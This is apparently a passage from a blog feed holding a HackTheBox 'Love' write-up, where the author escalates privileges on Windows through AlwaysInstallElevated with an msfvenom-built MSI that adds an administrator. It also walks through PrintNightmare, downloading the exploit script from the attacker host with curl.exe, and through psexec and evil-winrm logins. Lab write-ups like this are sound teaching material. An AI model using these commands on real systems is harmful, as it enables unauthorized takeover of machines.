+   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#alwaysinstallelevated
+    AlwaysInstallElevated set to 1 in HKLM!
+    AlwaysInstallElevated set to 1 in HKCU!
+</code></pre></div><h4 id="exploitation---malicious-msi-installer">Exploitation - Malicious .msi Installer</h4>
+<p>I will use <code>msfvenom</code> to generate a malicious <code>.msi</code> that will add a user with administrative access and host it aftewards.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «exploits» «10.10.14.51» 
+$ msfvenom -p windows/adduser <span class="nv">USER</span><span class="o">=</span>iamf <span class="nv">PASS</span><span class="o">=</span>P@ssword123! -f msi -o iamf.msi
+<span class="o">[</span>-<span class="o">]</span> No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+<span class="o">[</span>-<span class="o">]</span> No arch selected, selecting arch: x86 from the payload
+No encoder specified, outputting raw payload
+Payload size: <span class="m">270</span> bytes
+Final size of msi file: <span class="m">159744</span> bytes
+Saved as: iamf.msi
+</code></pre></div><p>On Love, I will grab the msi and install the package it immediately.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">PS C:<span class="se">\U</span>sers<span class="se">\P</span>ublic&gt; curl.exe -O 10.10.14.53/iamf.msi
+PS C:<span class="se">\U</span>sers<span class="se">\P</span>ublic&gt; msiexec /quiet /qn /i iamf.msi
+PS C:<span class="se">\U</span>sers<span class="se">\P</span>ublic&gt; net user
+
+User accounts <span class="k">for</span> <span class="se">\\</span>LOVE                                                                                                                                                   
+                                                                                                                                                                           
+-------------------------------------------------------------------------------                                                                                            
+Administrator            DefaultAccount           Guest                                                                                                                    
+iamf                     Phoebe                   WDAGUtilityAccount                                                                                                       
+The <span class="nb">command</span> completed successfully.                                                                                                                                        
+
+PS C:<span class="se">\U</span>sers<span class="se">\P</span>ublic&gt; 
+</code></pre></div><h4 id="psexec---system">Psexec - SYSTEM</h4>
+<p>And it&rsquo;s done.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «exploits» «10.10.14.49» 
+$ psexec.py love/iamf:<span class="s1">&#39;P@ssword123!&#39;</span>@10.10.10.239                                            
+Impacket v0.9.22.dev1+20200914.162022.81d44893 - Copyright <span class="m">2020</span> SecureAuth Corporation
+
+<span class="o">[</span>*<span class="o">]</span> Requesting shares on 10.10.10.239.....
+<span class="o">[</span>*<span class="o">]</span> Found writable share ADMIN$
+<span class="o">[</span>*<span class="o">]</span> Uploading file VlzRTIEE.exe
+<span class="o">[</span>*<span class="o">]</span> Opening SVCManager on 10.10.10.239.....
+<span class="o">[</span>*<span class="o">]</span> Creating service lRbn on 10.10.10.239.....
+<span class="o">[</span>*<span class="o">]</span> Starting service lRbn.....
+<span class="o">[</span>!<span class="o">]</span> Press <span class="nb">help</span> <span class="k">for</span> extra shell commands
+Microsoft Windows <span class="o">[</span>Version 10.0.19042.867<span class="o">]</span>
+<span class="o">(</span>c<span class="o">)</span> <span class="m">2020</span> Microsoft Corporation. All rights reserved.
+
+C:<span class="se">\W</span>INDOWS<span class="se">\s</span>ystem32&gt;whoami
+nt authority<span class="se">\s</span>ystem
+C:<span class="se">\W</span>INDOWS<span class="se">\s</span>ystem32&gt;hostname
+love
+</code></pre></div><h4 id="alternative-printnightmare">(Alternative) PrintNightmare</h4>
+<p>Love also vulnerable to LPE <a href="https://github.com/calebstewart/CVE-2021-1675">PrintNightmare</a>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">PS C:<span class="se">\U</span>sers<span class="se">\P</span>hoebe<span class="se">\D</span>ownloads&gt; Get-Service -name spooler
+
+Status   Name               DisplayName
+------   ----               -----------
+Running  spooler            Print Spooler
+PS C:<span class="se">\U</span>sers<span class="se">\P</span>hoebe<span class="se">\D</span>ownloads&gt; curl.exe -O 10.10.14.51/CVE-2021-1675.ps1
+PS C:<span class="se">\U</span>sers<span class="se">\P</span>hoebe<span class="se">\D</span>ownloads&gt; Import-Module .<span class="se">\C</span>VE-2021-1675.ps1
+PS C:<span class="se">\U</span>sers<span class="se">\P</span>hoebe<span class="se">\D</span>ownloads&gt; Invoke-Nightmare
+PS C:<span class="se">\U</span>sers<span class="se">\P</span>hoebe<span class="se">\D</span>ownloads&gt; net user
+
+User accounts <span class="k">for</span> <span class="se">\\</span>LOVE
+
+-------------------------------------------------------------------------------
+adm1n                    Administrator            DefaultAccount           
+Guest                    iamf                     Phoebe                   
+WDAGUtilityAccount       
+The <span class="nb">command</span> completed successfully.
+</code></pre></div><p>I can login via WinRM.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «love» «10.10.14.51» 
+$ evil-winrm -i 10.10.10.239 -u <span class="s1">&#39;adm1n&#39;</span> -p<span class="s1">&#39;P@ssw0rd&#39;</span>
+
+Evil-WinRM shell v2.4
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\a</span>dm1n<span class="se">\D</span>ocuments&gt; hostname
+Love
+</code></pre></div><hr>
+<h2 id="references">Reference(s)</h2>
+<ul>
+<li><a href="https://portswigger.net/web-security/ssrf">https://portswigger.net/web-security/ssrf</a></li>
+<li><a href="https://github.com/calebstewart/CVE-2021-1675">https://github.com/calebstewart/CVE-2021-1675</a></li>
+</ul>
+]]></content:encoded>
+    </item>
+    
     <item>
       <title>Play with PrintNightmare using HackTheBox machines</title>
       <link>https://fahmifj.github.io/blog/play-with-printnightmare/</link>
